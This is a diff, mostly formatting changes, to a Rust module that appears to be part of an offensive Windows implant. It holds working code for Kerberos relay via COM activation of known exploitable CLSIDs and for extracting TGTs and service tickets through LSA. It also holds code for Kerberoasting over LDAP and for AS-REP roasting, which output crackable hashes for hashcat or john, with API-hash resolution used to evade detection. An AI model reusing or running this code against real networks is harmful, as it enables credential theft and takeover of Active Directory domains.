@@ -40,8 +40,8 @@
 use anyhow::{anyhow, bail, Context, Result};
 use serde::Serialize;
 use std::ffi::c_void;
-use std::mem;
 use std::io::Read;
+use std::mem;
 use std::net::TcpListener;
 use std::ptr;
 
@@ -50,26 +50,22 @@ use std::ptr;
 /// CLSID for BITS (Background Intelligent Transfer Service) — known
 /// exploitable via KrbRelay.  COM activation forces Kerberos auth.
 const CLSID_BITS: [u8; 16] = [
-    0x4B, 0xD3, 0x91, 0x49, 0xA1, 0x80, 0x91, 0x42, 0x83, 0xB6, 0x33, 0x28, 0x36, 0x6B, 0x90,
-    0x97,
+    0x4B, 0xD3, 0x91, 0x49, 0xA1, 0x80, 0x91, 0x42, 0x83, 0xB6, 0x33, 0x28, 0x36, 0x6B, 0x90, 0x97,
 ];
 
 /// CLSID for ICertPassage — another known exploitable CLSID.
 const CLSID_ICERT_PASSAGE: [u8; 16] = [
-    0xF1, 0x28, 0x7B, 0xF8, 0xB9, 0xDA, 0x3B, 0x45, 0x8E, 0x1A, 0xDE, 0xC8, 0xE7, 0xDF, 0xB5,
-    0xCE,
+    0xF1, 0x28, 0x7B, 0xF8, 0xB9, 0xDA, 0x3B, 0x45, 0x8E, 0x1A, 0xDE, 0xC8, 0xE7, 0xDF, 0xB5, 0xCE,
 ];
 
 /// CLSID for Task Service — exploitable via COM activation.
 const CLSID_TASK_SERVICE: [u8; 16] = [
-    0x0F, 0x8D, 0xB9, 0x9A, 0x3B, 0xD1, 0xD1, 0x11, 0xB3, 0xF4, 0x00, 0xC0, 0x4F, 0x79, 0x98,
-    0x05,
+    0x0F, 0x8D, 0xB9, 0x9A, 0x3B, 0xD1, 0xD1, 0x11, 0xB3, 0xF4, 0x00, 0xC0, 0x4F, 0x79, 0x98, 0x05,
 ];
 
 /// CLSID for Update Orchestrator Service.
 const CLSID_UPDATE_ORCHESTRATOR: [u8; 16] = [
-    0xF1, 0x0B, 0x8D, 0x2C, 0x1E, 0x4D, 0xD0, 0x11, 0xBB, 0x9B, 0x00, 0xAA, 0x00, 0x3E, 0x7C,
-    0x0E,
+    0xF1, 0x0B, 0x8D, 0x2C, 0x1E, 0x4D, 0xD0, 0x11, 0xBB, 0x9B, 0x00, 0xAA, 0x00, 0x3E, 0x7C, 0x0E,
 ];
 
 // ── RPC / Kerberos ASN.1 constants ──────────────────────────────────
@@ -283,7 +279,10 @@ impl<'a> Asn1Parser<'a> {
     /// Read a raw byte slice of `n` bytes.
     fn read_bytes(&mut self, n: usize) -> Result<&'a [u8]> {
         if self.pos + n > self.data.len() {
-            bail!("ASN.1: need {n} bytes but only {} remaining", self.remaining());
+            bail!(
+                "ASN.1: need {n} bytes but only {} remaining",
+                self.remaining()
+            );
         }
         let slice = &self.data[self.pos..self.pos + n];
         self.pos += n;
@@ -417,9 +416,7 @@ fn parse_rpc_bind_request(data: &[u8]) -> Result<RpcSecurityTrailer> {
 
     let mut sec_trailer_offset = None;
     for i in (16..frag_length.saturating_sub(8)).rev() {
-        if data[i] == RPC_C_AUTHN_GSS_KERBERO
-            && i + 8 <= frag_length
-        {
+        if data[i] == RPC_C_AUTHN_GSS_KERBERO && i + 8 <= frag_length {
             let auth_pad = data[i + 2];
             if auth_pad <= 16 {
                 // Likely the sec trailer
@@ -429,8 +426,8 @@ fn parse_rpc_bind_request(data: &[u8]) -> Result<RpcSecurityTrailer> {
         }
     }
 
-    let offset = sec_trailer_offset
-        .context("Could not locate RPC security trailer in bind request")?;
+    let offset =
+        sec_trailer_offset.context("Could not locate RPC security trailer in bind request")?;
 
     let auth_type = data[offset];
     let auth_level = data[offset + 1];
@@ -587,9 +584,9 @@ impl ComActivationProxy {
 
         let coinitex: FnCoInitializeEx = mem::transmute(coinitex_addr);
         let hr = coinitex(ptr::null_mut(), 0x2); // COINIT_MULTITHREADED
-        // S_OK (0) or S_FALSE (1, already initialized) are both fine.
-        // RPC_E_CHANGED_MODE (0x80010106) — already initialized with different mode.
-        // Not fatal, continue.
+                                                 // S_OK (0) or S_FALSE (1, already initialized) are both fine.
+                                                 // RPC_E_CHANGED_MODE (0x80010106) — already initialized with different mode.
+                                                 // Not fatal, continue.
         if hr < 0 && hr as u32 != 0x80010106 && hr != 1 {
             bail!("CoInitializeEx failed: 0x{:08X}", hr as u32);
         }
@@ -597,15 +594,15 @@ impl ComActivationProxy {
         // Optionally call CoInitializeSecurity to request Kerberos auth.
         if let Some(addr) = coinitsec_addr {
             type FnCoInitializeSecurity = unsafe extern "system" fn(
-                LPVOID,        // pSecDesc
-                DWORD,         // cAuthSvc
-                *mut c_void,   // asAuthSvc (SOLE_AUTHENTICATION_SERVICE)
-                LPVOID,        // pReserved1
-                DWORD,         // dwAuthnLevel
-                DWORD,         // dwImpersonationLevel
-                LPVOID,        // pAuthList
-                DWORD,         // dwCapabilities
-                LPVOID,        // pReserved3
+                LPVOID,      // pSecDesc
+                DWORD,       // cAuthSvc
+                *mut c_void, // asAuthSvc (SOLE_AUTHENTICATION_SERVICE)
+                LPVOID,      // pReserved1
+                DWORD,       // dwAuthnLevel
+                DWORD,       // dwImpersonationLevel
+                LPVOID,      // pAuthList
+                DWORD,       // dwCapabilities
+                LPVOID,      // pReserved3
             ) -> HRESULT;
 
             let coinitsec: FnCoInitializeSecurity = mem::transmute(addr);
@@ -625,17 +622,21 @@ impl ComActivationProxy {
         }
 
         // Build COSERVERINFO with the target hostname.
-        let mut target_wide: Vec<u16> = self.target_host.encode_utf16().chain(std::iter::once(0)).collect();
+        let mut target_wide: Vec<u16> = self
+            .target_host
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
 
         // Build COAUTHINFO requesting Kerberos authentication.
         let auth_info = COAUTHINFO {
             dwAuthnSvc: RPC_C_AUTHN_GSS_KERBERO as DWORD,
-            dwAuthzSvc: 0, // RPC_C_AUTHZ_NONE
+            dwAuthzSvc: 0,                        // RPC_C_AUTHZ_NONE
             pwszServerPrincName: ptr::null_mut(), // Let COM determine the SPN.
             dwAuthnLevel: RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
             dwImpersonationLevel: RPC_C_IMP_LEVEL_IMPERSONATE,
             pAuthIdentityData: ptr::null_mut(), // Use current thread credentials.
-            dwCapabilities: 0, // EOAC_NONE
+            dwCapabilities: 0,                  // EOAC_NONE
         };
 
         let server_info = COSERVERINFO {
@@ -662,12 +663,12 @@ impl ComActivationProxy {
         // Type signature: CoCreateInstanceEx(REFCLSID, IUnknown*, DWORD,
         //   COSERVERINFO*, DWORD, MULTI_QI*) -> HRESULT
         type FnCoCreateInstanceEx = unsafe extern "system" fn(
-            *const GUID,      // rclsid
-            LPVOID,           // punkOuter
-            DWORD,            // dwClsCtx
+            *const GUID,       // rclsid
+            LPVOID,            // punkOuter
+            DWORD,             // dwClsCtx
             *mut COSERVERINFO, // pServerInfo
-            DWORD,            // dwCount
-            *mut MULTI_QI,    // pResults
+            DWORD,             // dwCount
+            *mut MULTI_QI,     // pResults
         ) -> HRESULT;
 
         let cocreate: FnCoCreateInstanceEx = mem::transmute(cocreate_addr);
@@ -873,7 +874,11 @@ pub fn execute_kerberos_relay(
 
     // Start the COM activation in a separate thread so that the listener
     // can accept the incoming connection concurrently.
-    let proxy = ComActivationProxy::new(clsid_bytes, &format!("{bind_address}:{bind_port}"), target_spn);
+    let proxy = ComActivationProxy::new(
+        clsid_bytes,
+        &format!("{bind_address}:{bind_port}"),
+        target_spn,
+    );
     let activation_handle = std::thread::spawn(move || {
         // SAFETY: COM activation is unsafe because it calls external Windows APIs.
         unsafe { proxy.trigger_activation() }
@@ -972,11 +977,16 @@ const KERB_SUBMIT_TICKET: u32 = 17;
 
 type FnLsaConnectUntrusted = unsafe extern "system" fn(*mut HANDLE) -> i32;
 type FnLsaCallAuthenticationPackage = unsafe extern "system" fn(
-    HANDLE, ULONG, *const u8, ULONG, *mut *mut u8, *mut ULONG, *mut i32,
+    HANDLE,
+    ULONG,
+    *const u8,
+    ULONG,
+    *mut *mut u8,
+    *mut ULONG,
+    *mut i32,
 ) -> i32;
-type FnLsaLookupAuthenticationPackage = unsafe extern "system" fn(
-    HANDLE, *const UNICODE_STRING, *mut ULONG,
-) -> i32;
+type FnLsaLookupAuthenticationPackage =
+    unsafe extern "system" fn(HANDLE, *const UNICODE_STRING, *mut ULONG) -> i32;
 type FnLsaFreeReturnBuffer = unsafe extern "system" fn(LPVOID) -> i32;
 
 use crate::win_types::{PVOID, ULONG, UNICODE_STRING};
@@ -987,7 +997,7 @@ use crate::win_types::{PVOID, ULONG, UNICODE_STRING};
 #[repr(C)]
 struct KerbRetrieveTktRequest {
     message_type: ULONG,
-    logon_id: i64,          // LUID — zero for current session
+    logon_id: i64, // LUID — zero for current session
     target_name: UNICODE_STRING,
     ticket_flags: ULONG,
     cache_options: ULONG,
@@ -1004,9 +1014,9 @@ struct KerbRetrieveTktResponse {
 /// KERB_EXTERNAL_TICKET — contains the encoded ticket.
 #[repr(C)]
 struct KerbExternalTicket {
-    service_name: *mut c_void,   // PKERB_PRINCIPAL_NAME
-    target_name: *mut c_void,    // PKERB_PRINCIPAL_NAME
-    client_name: *mut c_void,    // PKERB_PRINCIPAL_NAME
+    service_name: *mut c_void, // PKERB_PRINCIPAL_NAME
+    target_name: *mut c_void,  // PKERB_PRINCIPAL_NAME
+    client_name: *mut c_void,  // PKERB_PRINCIPAL_NAME
     domain_name: UNICODE_STRING,
     target_domain_name: UNICODE_STRING,
     alt_target_domain_name: UNICODE_STRING,
@@ -1119,8 +1129,14 @@ impl LsaKerbApis {
 
         Ok(LsaKerbApis {
             connect: resolve_fn!(pe_resolve::HASH_LSACONNECTUNTRUSTED, "LsaConnectUntrusted"),
-            call_pkg: resolve_fn!(pe_resolve::HASH_LSACALLAUTHENTICATIONPACKAGE, "LsaCallAuthenticationPackage"),
-            lookup_pkg: resolve_fn!(pe_resolve::HASH_LSALOOKUPAUTHENTICATIONPACKAGE, "LsaLookupAuthenticationPackage"),
+            call_pkg: resolve_fn!(
+                pe_resolve::HASH_LSACALLAUTHENTICATIONPACKAGE,
+                "LsaCallAuthenticationPackage"
+            ),
+            lookup_pkg: resolve_fn!(
+                pe_resolve::HASH_LSALOOKUPAUTHENTICATIONPACKAGE,
+                "LsaLookupAuthenticationPackage"
+            ),
             free_buf: resolve_fn!(pe_resolve::HASH_LSAFREERETURNBUFFER, "LsaFreeReturnBuffer"),
         })
     }
@@ -1154,10 +1170,8 @@ impl Drop for LsaHandle {
             type FnNtClose = unsafe extern "system" fn(HANDLE) -> i32;
             let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
             if let Some(base) = ntdll {
-                let close_addr = pe_resolve::get_proc_address_by_hash(
-                    base,
-                    pe_resolve::HASH_NTCLOSE,
-                );
+                let close_addr =
+                    pe_resolve::get_proc_address_by_hash(base, pe_resolve::HASH_NTCLOSE);
                 if let Some(addr) = close_addr {
                     let ntclose: FnNtClose = mem::transmute(addr);
                     ntclose(self.handle);
@@ -1187,17 +1201,17 @@ unsafe fn unicode_string_to_string(us: &UNICODE_STRING) -> String {
 }
 
 /// Look up the Kerberos authentication package ID.
-unsafe fn lookup_kerberos_package(
-    handle: HANDLE,
-    apis: &LsaKerbApis,
-) -> Result<ULONG> {
+unsafe fn lookup_kerberos_package(handle: HANDLE, apis: &LsaKerbApis) -> Result<ULONG> {
     let kerberos_w: Vec<u16> = "Kerberos\0".encode_utf16().collect();
     let pkg_name = make_unicode_string(&kerberos_w[..kerberos_w.len() - 1]);
 
     let mut package_id: ULONG = 0;
     let status = (apis.lookup_pkg)(handle, &pkg_name, &mut package_id);
     if status != 0 {
-        bail!("LsaLookupAuthenticationPackage(Kerberos) failed: 0x{:08X}", status as u32);
+        bail!(
+            "LsaLookupAuthenticationPackage(Kerberos) failed: 0x{:08X}",
+            status as u32
+        );
     }
     Ok(package_id)
 }
@@ -1226,7 +1240,8 @@ unsafe fn call_kerb_package(
     if status != 0 {
         bail!(
             "LsaCallAuthenticationPackage failed: NTSTATUS 0x{:08X}, protocol status 0x{:08X}",
-            status as u32, protocol_status as u32
+            status as u32,
+            protocol_status as u32
         );
     }
     if protocol_status != 0 {
@@ -1274,17 +1289,12 @@ pub fn get_tgt_for_current_user() -> Result<TgtResult> {
             logon_id: 0, // Current session
             target_name: empty_target,
             ticket_flags: 0,
-            cache_options: 0, // KERB_RETRIEVE_TICKET_DEFAULT
+            cache_options: 0,   // KERB_RETRIEVE_TICKET_DEFAULT
             encryption_type: 0, // Default
             credential_handle: 0,
         };
 
-        let (buf, buf_len) = call_kerb_package(
-            lsa.handle,
-            &apis,
-            pkg_id,
-            as_bytes(&request),
-        )?;
+        let (buf, buf_len) = call_kerb_package(lsa.handle, &apis, pkg_id, as_bytes(&request))?;
 
         if (buf_len as usize) < std::mem::size_of::<KerbRetrieveTktResponse>() {
             free_lsa_buffer(&apis, buf);
@@ -1355,12 +1365,7 @@ pub fn request_service_ticket(target_spn: &str) -> Result<TgsResult> {
             credential_handle: 0,
         };
 
-        let (buf, buf_len) = call_kerb_package(
-            lsa.handle,
-            &apis,
-            pkg_id,
-            as_bytes(&request),
-        )?;
+        let (buf, buf_len) = call_kerb_package(lsa.handle, &apis, pkg_id, as_bytes(&request))?;
 
         if (buf_len as usize) < std::mem::size_of::<KerbRetrieveTktResponse>() {
             free_lsa_buffer(&apis, buf);
@@ -1414,12 +1419,8 @@ pub fn list_cached_tickets() -> Result<Vec<serde_json::Value>> {
             logon_id: 0,
         };
 
-        if let Ok((buf, buf_len)) = call_kerb_package(
-            lsa.handle,
-            &apis,
-            pkg_id,
-            as_bytes(&tgt_req),
-        ) {
+        if let Ok((buf, buf_len)) = call_kerb_package(lsa.handle, &apis, pkg_id, as_bytes(&tgt_req))
+        {
             if buf_len as usize >= std::mem::size_of::<KerbTgtCacheResponse>() {
                 let resp = &*(buf as *const KerbTgtCacheResponse);
                 let count = resp.count_of_tgts as usize;
@@ -1453,12 +1454,8 @@ pub fn list_cached_tickets() -> Result<Vec<serde_json::Value>> {
             logon_id: 0,
         };
 
-        if let Ok((buf, buf_len)) = call_kerb_package(
-            lsa.handle,
-            &apis,
-            pkg_id,
-            as_bytes(&tgs_req),
-        ) {
+        if let Ok((buf, buf_len)) = call_kerb_package(lsa.handle, &apis, pkg_id, as_bytes(&tgs_req))
+        {
             if buf_len as usize >= std::mem::size_of::<KerbTgtCacheResponse>() {
                 let resp = &*(buf as *const KerbTgtCacheResponse);
                 let count = resp.count_of_tgts as usize;
@@ -1492,10 +1489,7 @@ pub fn list_cached_tickets() -> Result<Vec<serde_json::Value>> {
 
 /// Cast a struct to a byte slice (safe for repr(C) types).
 unsafe fn as_bytes<T: Sized>(val: &T) -> &[u8] {
-    std::slice::from_raw_parts(
-        val as *const T as *const u8,
-        std::mem::size_of::<T>(),
-    )
+    std::slice::from_raw_parts(val as *const T as *const u8, std::mem::size_of::<T>())
 }
 
 // ═══════════════════════════════════════════════════════════════════════
@@ -1530,20 +1524,31 @@ pub struct KerberoastEntry {
 type FnLdapInitW = unsafe extern "system" fn(*const u16, u32, u32) -> *mut c_void;
 type FnLdapBindW = unsafe extern "system" fn(*mut c_void, *const u16, *const c_void) -> u32;
 type FnLdapSearchW = unsafe extern "system" fn(
-    *mut c_void, *const u16, u32, *const u16, *mut *const u16, u32, *mut *mut c_void,
+    *mut c_void,
+    *const u16,
+    u32,
+    *const u16,
+    *mut *const u16,
+    u32,
+    *mut *mut c_void,
 ) -> u32;
-type FnLdapGetNextPage = unsafe extern "system" fn(
-    *mut c_void, u32, u32, *mut *mut c_void,
-) -> u32;
+type FnLdapGetNextPage = unsafe extern "system" fn(*mut c_void, u32, u32, *mut *mut c_void) -> u32;
 type FnLdapFirstEntry = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
 type FnLdapNextEntry = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
-type FnLdapGetValuesW = unsafe extern "system" fn(*mut c_void, *mut c_void, *const u16) -> *mut *mut u16;
+type FnLdapGetValuesW =
+    unsafe extern "system" fn(*mut c_void, *mut c_void, *const u16) -> *mut *mut u16;
 type FnLdapValueFreeW = unsafe extern "system" fn(*mut *mut u16) -> u32;
 type FnLdapMsgFree = unsafe extern "system" fn(*mut c_void) -> u32;
 type FnLdapUnbind = unsafe extern "system" fn(*mut c_void) -> u32;
 type FnLdapCountEntries = unsafe extern "system" fn(*mut c_void, *mut c_void) -> u32;
 type FnLdapGetPagedResult = unsafe extern "system" fn(
-    *mut c_void, *const u16, u32, *mut *const u16, u32, *mut *mut c_void, *mut u32,
+    *mut c_void,
+    *const u16,
+    u32,
+    *mut *const u16,
+    u32,
+    *mut *mut c_void,
+    *mut u32,
 ) -> u32;
 
 // LDAP result codes.
@@ -1559,7 +1564,12 @@ const KERB_ETYPE_AES256_CTS_HMAC_SHA196: i32 = 18;
 ///
 /// Parses the ASN.1/DER-encoded ticket to extract the encrypted part,
 /// then formats it as a `$krb5tgs$23$...` string for hashcat/john.
-fn extract_rc4_ticket(encoded_ticket: &[u8], spn: &str, username: &str, domain: &str) -> Result<String> {
+fn extract_rc4_ticket(
+    encoded_ticket: &[u8],
+    spn: &str,
+    username: &str,
+    domain: &str,
+) -> Result<String> {
     // The encoded ticket is a Kerberos Ticket structure (ASN.1):
     //   [APPLICATION 3] SEQUENCE {
     //     tkt-vno [0] INTEGER (5),
@@ -1617,7 +1627,11 @@ fn extract_rc4_ticket(encoded_ticket: &[u8], spn: &str, username: &str, domain: 
     // Skip inner SEQUENCE wrapper if present.
     let enc_inner = if enc_parser.remaining() > 0 {
         let (t, v) = enc_parser.read_tlv()?;
-        if t == ASN1_SEQUENCE_TAG { v } else { enc_body }
+        if t == ASN1_SEQUENCE_TAG {
+            v
+        } else {
+            enc_body
+        }
     } else {
         enc_body
     };
@@ -1626,7 +1640,11 @@ fn extract_rc4_ticket(encoded_ticket: &[u8], spn: &str, username: &str, domain: 
 
     // etype [0] INTEGER
     let (_, etype_val) = fields.read_tlv()?;
-    let etype = if etype_val.len() >= 1 { etype_val[0] as i32 } else { 0 };
+    let etype = if etype_val.len() >= 1 {
+        etype_val[0] as i32
+    } else {
+        0
+    };
 
     // kvno [1] INTEGER (optional)
     let kvno = if fields.remaining() > 0 {
@@ -1704,25 +1722,35 @@ pub fn kerberoast_spns(
 
         macro_rules! resolve_ldap_fn {
             ($name:expr, $ty:ty) => {
-                pe_resolve::get_proc_address_by_hash(wldap32, pe_resolve::hash_str(concat!($name, "\0").as_bytes()))
-                    .ok_or_else(|| anyhow!("{} not found in wldap32.dll", $name))
-                    .map(|addr| std::mem::transmute::<usize, $ty>(addr))?
+                pe_resolve::get_proc_address_by_hash(
+                    wldap32,
+                    pe_resolve::hash_str(concat!($name, "\0").as_bytes()),
+                )
+                .ok_or_else(|| anyhow!("{} not found in wldap32.dll", $name))
+                .map(|addr| std::mem::transmute::<usize, $ty>(addr))?
             };
         }
 
         let ldap_init: FnLdapInitW = resolve_ldap_fn!("ldap_initW", FnLdapInitW);
         let ldap_bind_s: FnLdapBindW = resolve_ldap_fn!("ldap_bind_sW", FnLdapBindW);
         let ldap_search_s: FnLdapSearchW = resolve_ldap_fn!("ldap_search_sW", FnLdapSearchW);
-        let ldap_first_entry: FnLdapFirstEntry = resolve_ldap_fn!("ldap_first_entry", FnLdapFirstEntry);
+        let ldap_first_entry: FnLdapFirstEntry =
+            resolve_ldap_fn!("ldap_first_entry", FnLdapFirstEntry);
         let ldap_next_entry: FnLdapNextEntry = resolve_ldap_fn!("ldap_next_entry", FnLdapNextEntry);
-        let ldap_get_values: FnLdapGetValuesW = resolve_ldap_fn!("ldap_get_valuesW", FnLdapGetValuesW);
-        let ldap_value_free: FnLdapValueFreeW = resolve_ldap_fn!("ldap_value_freeW", FnLdapValueFreeW);
+        let ldap_get_values: FnLdapGetValuesW =
+            resolve_ldap_fn!("ldap_get_valuesW", FnLdapGetValuesW);
+        let ldap_value_free: FnLdapValueFreeW =
+            resolve_ldap_fn!("ldap_value_freeW", FnLdapValueFreeW);
         let ldap_msg_free: FnLdapMsgFree = resolve_ldap_fn!("ldap_msgfree", FnLdapMsgFree);
         let ldap_unbind: FnLdapUnbind = resolve_ldap_fn!("ldap_unbind", FnLdapUnbind);
-        let ldap_count_entries: FnLdapCountEntries = resolve_ldap_fn!("ldap_count_entries", FnLdapCountEntries);
+        let ldap_count_entries: FnLdapCountEntries =
+            resolve_ldap_fn!("ldap_count_entries", FnLdapCountEntries);
 
         // ── Connect to LDAP ──────────────────────────────────────────
-        let dc_w: Vec<u16> = dc_address.encode_utf16().chain(std::iter::once(0)).collect();
+        let dc_w: Vec<u16> = dc_address
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
         let ld = ldap_init(dc_w.as_ptr(), 389, 0);
         if ld.is_null() {
             bail!("ldap_initW failed for {}", dc_address);
@@ -1775,13 +1803,23 @@ pub fn kerberoast_spns(
 
             // Re-resolve ldap_search_ext_sW for paged results.
             type FnLdapSearchExtS = unsafe extern "system" fn(
-                *mut c_void, *const u16, u32, *const u16, *mut *const u16, u32,
-                *mut c_void, *mut c_void, *mut i32, *mut c_void,
+                *mut c_void,
+                *const u16,
+                u32,
+                *const u16,
+                *mut *const u16,
+                u32,
+                *mut c_void,
+                *mut c_void,
+                *mut i32,
+                *mut c_void,
             ) -> u32;
 
-            let ldap_search_ext_s: Option<FnLdapSearchExtS> =
-                pe_resolve::get_proc_address_by_hash(wldap32, pe_resolve::hash_str(b"ldap_search_ext_sW\0"))
-                    .map(|addr| std::mem::transmute::<usize, FnLdapSearchExtS>(addr));
+            let ldap_search_ext_s: Option<FnLdapSearchExtS> = pe_resolve::get_proc_address_by_hash(
+                wldap32,
+                pe_resolve::hash_str(b"ldap_search_ext_sW\0"),
+            )
+            .map(|addr| std::mem::transmute::<usize, FnLdapSearchExtS>(addr));
 
             let status = if let Some(search_ext) = ldap_search_ext_s {
                 search_ext(
@@ -1860,7 +1898,9 @@ pub fn kerberoast_spns(
                 let mut spn_idx = 0;
                 loop {
                     let spn_ptr = *spn_values.add(spn_idx);
-                    if spn_ptr.is_null() { break; }
+                    if spn_ptr.is_null() {
+                        break;
+                    }
 
                     let slice = std::slice::from_raw_parts(spn_ptr, 256);
                     let end = slice.iter().position(|&c| c == 0).unwrap_or(slice.len());
@@ -1873,12 +1913,8 @@ pub fn kerberoast_spns(
                     match request_service_ticket(&spn) {
                         Ok(tgs) => {
                             // Extract hash from the encoded ticket.
-                            let hash_result = extract_rc4_ticket(
-                                &tgs.encoded_ticket,
-                                &spn,
-                                &username,
-                                &domain,
-                            );
+                            let hash_result =
+                                extract_rc4_ticket(&tgs.encoded_ticket, &spn, &username, &domain);
 
                             match hash_result {
                                 Ok(hash) => {
@@ -1894,7 +1930,8 @@ pub fn kerberoast_spns(
                                 Err(e) => {
                                     tracing::warn!(
                                         "Kerberoast: failed to extract hash for {}: {}",
-                                        spn, e
+                                        spn,
+                                        e
                                     );
                                     // Still record the entry without a crackable hash.
                                     results.push(KerberoastEntry {
@@ -2038,7 +2075,12 @@ fn build_as_req_no_preauth(username: &str, realm: &str, etype: i32) -> Vec<u8> {
         23 => vec![der_integer(23), der_integer(18), der_integer(17)],
         _ => vec![der_integer(etype), der_integer(23)],
     };
-    let etype_seq = der_sequence(&etypes.iter().flat_map(|e| e.iter().copied()).collect::<Vec<_>>());
+    let etype_seq = der_sequence(
+        &etypes
+            .iter()
+            .flat_map(|e| e.iter().copied())
+            .collect::<Vec<_>>(),
+    );
 
     // KDC-REQ-BODY ::= SEQUENCE {
     //   kdc-options [0] KDCOptions (forwardable, renewable, canonicalize),
@@ -2053,28 +2095,36 @@ fn build_as_req_no_preauth(username: &str, realm: &str, etype: i32) -> Vec<u8> {
     let kdc_options = der_explicit_ctx(0, &der_sequence(&[0x03, 0x02, 0x40, 0x81]));
 
     let cname_inner: Vec<u8> = der_explicit_ctx(0, &der_integer(1))
-        .iter().chain(der_general_string(username).iter())
-        .copied().collect();
+        .iter()
+        .chain(der_general_string(username).iter())
+        .copied()
+        .collect();
     let cname = der_explicit_ctx(1, &der_sequence(&cname_inner));
 
     let sname_inner: Vec<u8> = der_explicit_ctx(0, &der_integer(2))
-        .iter().chain(der_general_string(&krbtgt_name).iter())
-        .copied().collect();
+        .iter()
+        .chain(der_general_string(&krbtgt_name).iter())
+        .copied()
+        .collect();
     let sname = der_explicit_ctx(3, &der_sequence(&sname_inner));
 
-    let req_body_inner: Vec<u8> = kdc_options.iter()
+    let req_body_inner: Vec<u8> = kdc_options
+        .iter()
         .chain(cname.iter())
         .chain(der_explicit_ctx(2, &der_general_string(realm)).iter())
         .chain(sname.iter())
         .chain(der_explicit_ctx(5, &etype_seq).iter())
-        .copied().collect();
+        .copied()
+        .collect();
     let req_body = der_sequence(&req_body_inner);
 
     // Full AS-REQ.
     let inner: Vec<u8> = der_explicit_ctx(0, &der_integer(5))
-        .iter().chain(der_explicit_ctx(1, &der_integer(10)).iter())
+        .iter()
+        .chain(der_explicit_ctx(1, &der_integer(10)).iter())
         .chain(der_explicit_ctx(4, &req_body).iter())
-        .copied().collect();
+        .copied()
+        .collect();
 
     // [APPLICATION 10] = tag 0x6A
     der_tag_len(0x6A, &inner)
@@ -2134,7 +2184,9 @@ fn parse_as_rep_for_hash(data: &[u8], username: &str, realm: &str) -> Result<AsR
 
     // Now read remaining fields by context tag.
     while scan.remaining() > 0 {
-        let Ok((f_tag, f_val)) = scan.read_tlv() else { break };
+        let Ok((f_tag, f_val)) = scan.read_tlv() else {
+            break;
+        };
 
         match f_tag {
             0xA6 => {
@@ -2142,7 +2194,11 @@ fn parse_as_rep_for_hash(data: &[u8], username: &str, realm: &str) -> Result<AsR
                 // Parse: SEQUENCE { etype [0], kvno [1] (opt), cipher [2] }
                 let mut enc_parser = Asn1Parser::new(f_val);
                 let (inner_tag, inner_val) = enc_parser.read_tlv()?;
-                let enc_seq = if inner_tag == ASN1_SEQUENCE_TAG { inner_val } else { f_val };
+                let enc_seq = if inner_tag == ASN1_SEQUENCE_TAG {
+                    inner_val
+                } else {
+                    f_val
+                };
 
                 let mut enc_fields = Asn1Parser::new(enc_seq);
                 // etype [0]
@@ -2257,25 +2313,41 @@ pub fn asrep_roast(
         let _ = stream.set_write_timeout(Some(std::time::Duration::from_secs(5)));
 
         if let Err(e) = stream.write_all(&framed) {
-            tracing::warn!("AS-REP roast: failed to send AS-REQ for {}: {}", username, e);
+            tracing::warn!(
+                "AS-REP roast: failed to send AS-REQ for {}: {}",
+                username,
+                e
+            );
             continue;
         }
 
         // Read response.
         let mut resp_len_buf = [0u8; 4];
         if let Err(e) = stream.read_exact(&mut resp_len_buf) {
-            tracing::warn!("AS-REP roast: failed to read response length for {}: {}", username, e);
+            tracing::warn!(
+                "AS-REP roast: failed to read response length for {}: {}",
+                username,
+                e
+            );
             continue;
         }
         let resp_len = u32::from_be_bytes(resp_len_buf) as usize;
         if resp_len > 1_000_000 {
-            tracing::warn!("AS-REP roast: response too large ({} bytes) for {}", resp_len, username);
+            tracing::warn!(
+                "AS-REP roast: response too large ({} bytes) for {}",
+                resp_len,
+                username
+            );
             continue;
         }
 
         let mut resp_buf = vec![0u8; resp_len];
         if let Err(e) = stream.read_exact(&mut resp_buf) {
-            tracing::warn!("AS-REP roast: failed to read response for {}: {}", username, e);
+            tracing::warn!(
+                "AS-REP roast: failed to read response for {}: {}",
+                username,
+                e
+            );
             continue;
         }
 
@@ -2293,7 +2365,11 @@ pub fn asrep_roast(
                 results.push(entry);
             }
             Err(e) => {
-                tracing::warn!("AS-REP roast: failed to parse AS-REP for {}: {}", username, e);
+                tracing::warn!(
+                    "AS-REP roast: failed to parse AS-REP for {}: {}",
+                    username,
+                    e
+                );
             }
         }
     }
@@ -2313,29 +2389,45 @@ pub fn asrep_roast_ldap(dc_address: &str, etype: i32) -> Result<Vec<AsRepRoastEn
 
         macro_rules! resolve_ldap_fn {
             ($name:expr, $ty:ty) => {
-                pe_resolve::get_proc_address_by_hash(wldap32, pe_resolve::hash_str(concat!($name, "\0").as_bytes()))
-                    .ok_or_else(|| anyhow!("{} not found in wldap32.dll", $name))
-                    .map(|addr| std::mem::transmute::<usize, $ty>(addr))?
+                pe_resolve::get_proc_address_by_hash(
+                    wldap32,
+                    pe_resolve::hash_str(concat!($name, "\0").as_bytes()),
+                )
+                .ok_or_else(|| anyhow!("{} not found in wldap32.dll", $name))
+                .map(|addr| std::mem::transmute::<usize, $ty>(addr))?
             };
         }
 
         let ldap_init: FnLdapInitW = resolve_ldap_fn!("ldap_initW", FnLdapInitW);
         let ldap_bind_s: FnLdapBindW = resolve_ldap_fn!("ldap_bind_sW", FnLdapBindW);
-        let ldap_first_entry: FnLdapFirstEntry = resolve_ldap_fn!("ldap_first_entry", FnLdapFirstEntry);
+        let ldap_first_entry: FnLdapFirstEntry =
+            resolve_ldap_fn!("ldap_first_entry", FnLdapFirstEntry);
         let ldap_next_entry: FnLdapNextEntry = resolve_ldap_fn!("ldap_next_entry", FnLdapNextEntry);
-        let ldap_get_values: FnLdapGetValuesW = resolve_ldap_fn!("ldap_get_valuesW", FnLdapGetValuesW);
-        let ldap_value_free: FnLdapValueFreeW = resolve_ldap_fn!("ldap_value_freeW", FnLdapValueFreeW);
+        let ldap_get_values: FnLdapGetValuesW =
+            resolve_ldap_fn!("ldap_get_valuesW", FnLdapGetValuesW);
+        let ldap_value_free: FnLdapValueFreeW =
+            resolve_ldap_fn!("ldap_value_freeW", FnLdapValueFreeW);
         let ldap_msg_free: FnLdapMsgFree = resolve_ldap_fn!("ldap_msgfree", FnLdapMsgFree);
